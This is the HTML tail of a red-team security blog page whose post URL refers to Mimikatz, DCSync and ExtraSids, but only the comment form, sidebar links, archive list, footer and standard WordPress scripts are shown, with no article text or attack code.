		<h3 id="reply-title" class="comment-reply-title">Leave a Comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#respond" style="display:none;">Cancel Reply</a></small></h3><form action="http://www.harmj0y.net/blog/wp-comments-post.php" method="post" id="ast-commentform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><div class="ast-row comment-textarea"><fieldset class="comment-form-comment"><div class="comment-form-textarea ast-grid-common-col"><label for="comment" class="screen-reader-text">Type here..</label><textarea id="comment" name="comment" placeholder="Type here.." cols="45" rows="8" aria-required="true"></textarea></div></fieldset></div><div class="ast-comment-formwrap ast-row"><p class="comment-form-author ast-grid-common-col ast-width-lg-33 ast-width-md-4 ast-float"><label for="author" class="screen-reader-text">Name*</label><input id="author" name="author" type="text" value="" placeholder="Name*" size="30" aria-required='true' /></p>
<p class="comment-form-email ast-grid-common-col ast-width-lg-33 ast-width-md-4 ast-float"><label for="email" class="screen-reader-text">Email*</label><input id="email" name="email" type="text" value="" placeholder="Email*" size="30" aria-required='true' /></p>
<p class="comment-form-url ast-grid-common-col ast-width-lg-33 ast-width-md-4 ast-float"><label for="url"><label for="url" class="screen-reader-text">Website</label><input id="url" name="url" type="text" value="" placeholder="Website" size="30" /></label></p></div>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notify me of follow-up comments by email.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notify me of new posts by email.</label></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment &raquo;" /> <input type='hidden' name='comment_post_ID' value='1660' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="65e1a8cd0b" /></p><input type="hidden" id="ak_js" name="ak_js" value="139"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	<p class="akismet_comment_form_privacy_notice">This site uses Akismet to reduce spam. <a href="https://akismet.com/privacy/" target="_blank" rel="nofollow noopener">Learn how your comment data is processed</a>.</p>
	
</div><!-- #comments -->
			</main><!-- #main -->
			
		
	</div><!-- #primary -->


	<div class="widget-area secondary" id="secondary" role="complementary" itemtype="https://schema.org/WPSideBar" itemscope="itemscope">
	<div class="sidebar-main" >
				<aside id="media_image-5" class="widget widget_media_image"><a href="https://specterops.io/" target="_blank" rel="noopener"><img width="751" height="786" src="http://www.harmj0y.net/blog/wp-content/uploads/2017/07/specterops.png" class="image wp-image-4177 alignleft attachment-full size-full" alt="" loading="lazy" style="max-width: 100%; height: auto;" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2017/07/specterops.png 751w, http://www.harmj0y.net/blog/wp-content/uploads/2017/07/specterops-287x300.png 287w" sizes="(max-width: 751px) 100vw, 751px" /></a></aside>
		<aside id="recent-posts-2" class="widget widget_recent_entries">
		<h2 class="widget-title">Recent Posts</h2><nav role="navigation" aria-label="Recent Posts">
		<ul>
											<li>
					<a href="http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">A Case Study in Wagging the Dog: Computer Takeover</a>
									</li>
											<li>
					<a href="http://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/">Kerberoasting Revisited</a>
									</li>
											<li>
					<a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a>
									</li>
											<li>
					<a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">Another Word on Delegation</a>
									</li>
											<li>
					<a href="http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">Rubeus &#8211; Now With More Kekeo</a>
									</li>
					</ul>

		</nav></aside><aside id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2>		<label class="screen-reader-text" for="archives-dropdown-2">Archives</label>
		<select id="archives-dropdown-2" name="archive-dropdown">
			
			<option value="">Select Month</option>
				<option value='http://www.harmj0y.net/blog/2019/02/'> February 2019 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2018/11/'> November 2018 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2018/10/'> October 2018 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2018/09/'> September 2018 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2018/08/'> August 2018 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2018/07/'> July 2018 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2018/04/'> April 2018 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/11/'> November 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/10/'> October 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/09/'> September 2017 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2017/08/'> August 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/07/'> July 2017 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2017/06/'> June 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/05/'> May 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/03/'> March 2017 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2017/01/'> January 2017 &nbsp;(4)</option>
	<option value='http://www.harmj0y.net/blog/2016/12/'> December 2016 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2016/11/'> November 2016 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2016/10/'> October 2016 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2016/09/'> September 2016 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2016/08/'> August 2016 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2016/07/'> July 2016 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2016/06/'> June 2016 &nbsp;(3)</option>
	<option value='http://www.harmj0y.net/blog/2016/05/'> May 2016 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2016/04/'> April 2016 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2016/03/'> March 2016 &nbsp;(4)</option>
	<option value='http://www.harmj0y.net/blog/2016/02/'> February 2016 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2016/01/'> January 2016 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/12/'> December 2015 &nbsp;(4)</option>
	<option value='http://www.harmj0y.net/blog/2015/11/'> November 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/10/'> October 2015 &nbsp;(3)</option>
	<option value='http://www.harmj0y.net/blog/2015/09/'> September 2015 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2015/08/'> August 2015 &nbsp;(3)</option>
	<option value='http://www.harmj0y.net/blog/2015/07/'> July 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/06/'> June 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/05/'> May 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/04/'> April 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/03/'> March 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2015/01/'> January 2015 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2014/12/'> December 2014 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2014/11/'> November 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/10/'> October 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/09/'> September 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/08/'> August 2014 &nbsp;(1)</option>
	<option value='http://www.harmj0y.net/blog/2014/07/'> July 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/06/'> June 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/05/'> May 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/04/'> April 2014 &nbsp;(2)</option>
	<option value='http://www.harmj0y.net/blog/2014/03/'> March 2014 &nbsp;(1)</option>

		</select>

<script>
/* <![CDATA[ */
(function() {
	var dropdown = document.getElementById( "archives-dropdown-2" );
	function onSelectChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value !== '' ) {
			document.location.href = this.options[ this.selectedIndex ].value;
		}
	}
	dropdown.onchange = onSelectChange;
})();
/* ]]> */
</script>
			</aside><aside id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="http://www.harmj0y.net/blog/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
					<button class="search-submit">
				<span hidden>Search</span>
				<i><span class="ast-icon icon-search"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-888 480 142 142" enable-background="new -888 480 142 142" xml:space="preserve">
				<title/>
				<desc/>
				<path id="Shape" d="M-787.4,568.7h-6.3l-2.4-2.4c7.9-8.7,12.6-20.5,12.6-33.1c0-28.4-22.9-51.3-51.3-51.3  c-28.4,0-51.3,22.9-51.3,51.3c0,28.4,22.9,51.3,51.3,51.3c12.6,0,24.4-4.7,33.1-12.6l2.4,2.4v6.3l39.4,39.4l11.8-11.8L-787.4,568.7  L-787.4,568.7z M-834.7,568.7c-19.7,0-35.5-15.8-35.5-35.5c0-19.7,15.8-35.5,35.5-35.5c19.7,0,35.5,15.8,35.5,35.5  C-799.3,553-815,568.7-834.7,568.7L-834.7,568.7z"/>
				</svg></span></i>
			</button>
			</label>
	<input type="submit" class="search-submit" value="Search">
</form>
</aside><aside id="categories-4" class="widget widget_categories"><h2 class="widget-title">Categories</h2><nav role="navigation" aria-label="Categories">
			<ul>
					<li class="cat-item cat-item-38"><a href="http://www.harmj0y.net/blog/category/activedirectory/">ActiveDirectory</a>
</li>
	<li class="cat-item cat-item-25"><a href="http://www.harmj0y.net/blog/category/defense/">Defense</a>
</li>
	<li class="cat-item cat-item-21"><a href="http://www.harmj0y.net/blog/category/empire/">Empire</a>
</li>
	<li class="cat-item cat-item-32"><a href="http://www.harmj0y.net/blog/category/empyre/">EmPyre</a>
</li>
	<li class="cat-item cat-item-12"><a href="http://www.harmj0y.net/blog/category/informational/">Informational</a>
</li>
	<li class="cat-item cat-item-8"><a href="http://www.harmj0y.net/blog/category/penetesting/">Penetesting</a>
</li>
	<li class="cat-item cat-item-3"><a href="http://www.harmj0y.net/blog/category/powershell/">Powershell</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://www.harmj0y.net/blog/category/python/">Python</a>
</li>
	<li class="cat-item cat-item-7"><a href="http://www.harmj0y.net/blog/category/redteaming/">Red Teaming</a>
</li>
	<li class="cat-item cat-item-50"><a href="http://www.harmj0y.net/blog/category/top-posts/">Top Posts</a>
</li>
			</ul>

			</nav></aside><aside id="linkcat-2" class="widget widget_links"><h2 class="widget-title">Blogroll</h2>
	<ul class='xoxo blogroll'>
<li><a href="https://bluescreenofjeff.com/">bluescreenofjeff.com</a></li>
<li><a href="https://enigma0x3.net/">enigma0x3.net</a></li>
<li><a href="http://www.invoke-ir.com/">invoke-ir.com</a></li>
<li><a href="https://wald0.com/">wald0.com</a></li>

	</ul>
</aside>
<aside id="twitter_timeline-3" class="widget widget_twitter_timeline"><a class="twitter-timeline" data-width="220" data-theme="dark" data-border-color="#e8e8e8" data-tweet-limit="5" data-lang="EN" data-partner="jetpack" data-chrome="noscrollbar" href="https://twitter.com/harmj0y" href="https://twitter.com/harmj0y">My Tweets</a></aside>
	</div><!-- .sidebar-main -->
</div><!-- #secondary -->


	</div> <!-- ast-container -->
	</div><!-- #content -->
<footer
class="site-footer" id="colophon" itemtype="https://schema.org/WPFooter" itemscope="itemscope" itemid="#colophon">
			<div class="site-primary-footer-wrap ast-builder-grid-row-container site-footer-focus-item ast-builder-grid-row-3-equal ast-builder-grid-row-tablet-3-equal ast-builder-grid-row-mobile-full ast-footer-row-stack ast-footer-row-tablet-stack ast-footer-row-mobile-stack" data-section="section-primary-footer-builder">
	<div class="ast-builder-grid-row-container-inner">
					<div class="ast-builder-footer-grid-columns site-primary-footer-inner-wrap ast-builder-grid-row">
											<div class="site-footer-primary-section-1 site-footer-section site-footer-section-1">
								<div class="footer-widget-area widget-area site-footer-focus-item" data-section="section-footer-menu">
							</div>
							</div>
											<div class="site-footer-primary-section-2 site-footer-section site-footer-section-2">
									</div>
											<div class="site-footer-primary-section-3 site-footer-section site-footer-section-3">
									</div>
										</div>
			</div>

</div>
<div class="site-below-footer-wrap ast-builder-grid-row-container site-footer-focus-item ast-builder-grid-row-full ast-builder-grid-row-tablet-full ast-builder-grid-row-mobile-full ast-footer-row-stack ast-footer-row-tablet-stack ast-footer-row-mobile-stack" data-section="section-below-footer-builder">
	<div class="ast-builder-grid-row-container-inner">
					<div class="ast-builder-footer-grid-columns site-below-footer-inner-wrap ast-builder-grid-row">
											<div class="site-footer-below-section-1 site-footer-section site-footer-section-1">
								<div class="ast-builder-layout-element ast-flex site-footer-focus-item ast-footer-copyright" data-section="section-footer-builder">
				<div class="ast-footer-copyright"><p>Copyright &copy; 2021 harmj0y | Designed by <a href="http://felicitybrigham.com">Felicity Brigham Design</a></p>
</div>			</div>
						</div>
										</div>
			</div>

</div>
	</footer><!-- #colophon -->
	</div><!-- #page -->
	<div style="display:none">
	<div class="grofile-hash-map-c7b27acccc23b613b291d529467037e3">
	</div>
	<div class="grofile-hash-map-a874809641a854ae50e959b608dadefc">
	</div>
	<div class="grofile-hash-map-09cfbb06ee794b4524d7c0f2646f493b">
	</div>
	<div class="grofile-hash-map-de188e5fd0ca638236f070b5c914a05b">
	</div>
	</div>
<script src='http://www.harmj0y.net/blog/wp-includes/js/comment-reply.min.js?ver=5.7.2' id='comment-reply-js'></script>
<script id='astra-theme-js-js-extra'>
var astra = {"break_point":"921","isRtl":""};
</script>
<script src='http://www.harmj0y.net/blog/wp-content/themes/astra/assets/js/minified/frontend.min.js?ver=3.4.2' id='astra-theme-js-js'></script>
<script src='https://secure.gravatar.com/js/gprofiles.js?ver=202120' id='grofiles-cards-js'></script>
<script id='wpgroho-js-extra'>
var WPGroHo = {"my_hash":""};
</script>
<script src='http://www.harmj0y.net/blog/wp-content/plugins/jetpack/modules/wpgroho.js?ver=9.7' id='wpgroho-js'></script>
<script src='http://www.harmj0y.net/blog/wp-content/plugins/jetpack/_inc/build/twitter-timeline.min.js?ver=4.0.0' id='jetpack-twitter-timeline-js'></script>
<script src='http://www.harmj0y.net/blog/wp-includes/js/wp-embed.min.js?ver=5.7.2' id='wp-embed-js'></script>
<script async="async" src='http://www.harmj0y.net/blog/wp-content/plugins/akismet/_inc/form.js?ver=4.1.9' id='akismet-form-js'></script>
			<script>
			/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
			</script>
			<script src='https://stats.wp.com/e-202120.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.7',blog:'65454229',post:'1660',tz:'-5',srv:'www.harmj0y.net'} ]);
	_stq.push([ 'clickTrackerInit', '65454229', '1660' ]);
</script>
	</body>
</html>

<!-- Page generated by LiteSpeed Cache 3.6.4 on 2021-05-22 16:55:10 -->